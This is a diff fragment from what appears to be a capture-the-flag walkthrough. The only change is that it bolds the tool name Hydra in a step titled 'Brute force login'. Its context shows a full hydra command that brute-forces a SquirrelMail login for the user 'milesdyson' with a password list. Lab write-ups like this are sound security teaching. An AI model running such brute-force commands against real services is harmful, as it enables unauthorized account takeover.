@@ -64,7 +64,7 @@ You can follow our official walkthrough for this challenge on [our blog](https:/
 
 	![logs](./images/logs.png)
 
-* Brute force login with hydra
+* Brute force login with **Hydra**
 
 	```
 	hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
